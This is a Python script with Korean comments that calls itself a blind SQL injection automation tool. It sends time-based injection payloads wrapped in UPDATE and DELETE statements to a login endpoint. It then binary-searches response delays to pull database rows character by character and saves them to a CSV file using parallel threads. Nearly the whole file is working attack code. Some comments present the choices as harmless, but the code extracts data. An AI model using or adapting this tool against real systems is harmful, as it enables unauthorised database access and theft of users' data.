import argparse, random, requests, csv
from datetime import datetime
from math import floor
from multiprocessing.dummy import Pool as ThreadPool
from time import sleep

# 기본 설정 변수
_url = "http://localhost:8080/login"
_payload = {}
_method = "post"
_param = None
_table = None
_column = None
_ref_resp_time = None
_time_to_sleep = None
_max_row_length = 50
_max_rows = 1000
_threads = 4  # 병렬 처리할 스레드 수

# 다양한 데이터베이스와 환경에 대응하기 위한 무해한 필드 선택
_time_based_injections = {
    "update": {
        "char": "UPDATE users SET last_login = last_login WHERE 1=0 AND IF(unicode(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0))",
        "len": "UPDATE users SET last_login = last_login WHERE 1=0 AND IF(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0))"
    },
    "delete": {
        "char": "DELETE FROM users WHERE id = -1 AND IF(unicode(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0))",
        "len": "DELETE FROM users WHERE id = -1 AND IF(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0))"
    }
}

# 평균 응답 시간 반환 함수
def _get_resp_time(payload, retries=3):
    headers = {'User-Agent': 'Mozilla/5.0'}
    times = []
    for attempt in range(retries):
        try:
            response = requests.post(_url, data=payload, headers=headers) if _method == 'post' else requests.get(_url, params=payload, headers=headers)
            times.append(response.elapsed.total_seconds())
            sleep(0.1)
        except requests.exceptions.RequestException as e:
            print(f"[오류] 요청 중 예외 발생: {e}, 시도 횟수: {attempt + 1}")
            return float('inf')
    avg_time = sum(times) / len(times) if times else float('inf')
    print(f"[DEBUG] 평균 응답 시간: {avg_time:.3f} 초")
    return avg_time

# 서버 부하를 줄이기 위한 대기
def _delay():
    sleep_duration = random.triangular(0.1, _time_to_sleep)
    print(f"[DEBUG] 대기 시간: {sleep_duration:.3f} 초")
    sleep(sleep_duration)

# 초기 참조 응답 시간 설정
def _init_ref_resp_time():
    global _time_to_sleep
    times = [_get_resp_time(_payload) for _ in range(10)]
    times.sort()
    _time_to_sleep = sum(times[2:-2]) / (len(times) - 4) * 4.5  # 극단값 제외한 평균
    print(f'[*] 주입 대기 시간 설정: {_time_to_sleep:.3f} 초')

# 특정 인덱스의 문자 추출 및 디코딩 처리
def _get_char(row, index, mode="update"):
    min_index, max_index = 32, 126
    params = dict(_payload)
    injection = _time_based_injections[mode]["char"]

    while min_index <= max_index:
        mid_index = floor((max_index + min_index) / 2)
        eq_injection = injection % (_column, _table, row, index, '=' + str(mid_index), str(_time_to_sleep))
        gt_injection = injection % (_column, _table, row, index, '>' + str(mid_index), str(_time_to_sleep))

        params[_param] = eq_injection
        eq_time = _get_resp_time(params)
        if eq_time >= _time_to_sleep:
            print(f"[DEBUG] 행 {row}, 인덱스 {index}에서 발견한 문자: {chr(mid_index)}")
            return chr(mid_index)

        params[_param] = gt_injection
        gt_time = _get_resp_time(params)
        if gt_time >= _time_to_sleep:
            min_index = mid_index + 1
        else:
            max_index = mid_index - 1
        _delay()
    return None

# 행 길이 추출
def _get_row_length(row, mode="update"):
    params = dict(_payload)
    injection = _time_based_injections[mode]["len"]

    for test_length in range(1, _max_row_length + 1):
        params[_param] = injection % (_column, _table, row, test_length, str(_time_to_sleep))
        if _get_resp_time(params) > _time_to_sleep:
            print(f"[DEBUG] 행 {row}의 길이: {test_length}")
            return test_length
        _delay()
    return 0

# 코드 내 행 데이터 추출을 위한 병렬화 추가
def _extract_row(row):
    length = _get_row_length(row)
    if length == 0:
        return (row, None)
    value = ''.join(_get_char(row, j + 1) or '?' for j in range(length))

    try:
        decoded_value = value.encode('latin1').decode('utf-8')
    except UnicodeDecodeError:
        decoded_value = value

    print(f'[*] 행 {row} 추출 완료: {decoded_value}')
    return (row, decoded_value)

# 전체 데이터 행을 병렬로 추출하고 CSV 파일에 저장
def _get_all_rows(output_file="추출된_데이터.csv", mode="update"):
    start = datetime.now()
    with open(output_file, mode='w', newline='', encoding='utf-8-sig') as file:
        writer = csv.writer(file)
        writer.writerow(["행 번호", "추출된 데이터"])

        # 병렬화를 위한 ThreadPool 설정
        with ThreadPool(_threads) as pool:
            results = pool.map(lambda r: _extract_row(r), range(_max_rows))

        # 추출된 데이터를 CSV 파일에 기록
        for row, value in results:
            if value is not None:
                writer.writerow([row, value])
                
    print(f'[*] 전체 데이터 추출 완료: {(datetime.now() - start).total_seconds():.3f} 초')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Blind SQL Injection 자동화 도구")
    parser.add_argument("--output_file", type=str, help="결과 저장 CSV 파일 이름", default="추출된_데이터.csv")
    parser.add_argument("--mode", type=str, choices=["update", "delete"], help="SQL Injection 구문 모드", default="update")
    args = parser.parse_args()

    # 초기 설정 및 평균 응답 시간 계산
    print("[*] 초기 설정 시작...")
    _init_ref_resp_time()

    # 병렬 처리를 통한 데이터 추출 시작
    _get_all_rows(args.output_file, args.mode)